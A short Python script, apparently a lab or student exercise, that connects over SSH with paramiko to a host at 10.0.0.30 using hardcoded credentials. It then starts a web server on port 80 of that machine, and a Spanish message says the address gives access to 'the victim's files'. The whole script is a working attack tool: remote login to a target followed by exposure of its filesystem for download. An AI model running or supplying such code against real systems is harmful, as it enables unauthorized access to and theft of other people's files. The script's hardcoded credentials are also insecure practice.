import paramiko
import os

host = '10.0.0.30'
user = 'luisam'
password = 'luisam'

client = paramiko.SSHClient()
client.load_host_keys('/home/luisam/.ssh/known_hosts')
client.connect(host, username=user, password=password)
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
print('Debes escribir esta direccion en el navegador para acceder a los archivos de la victima: ', host)
client.exec_command('python3 -m http.server 80')
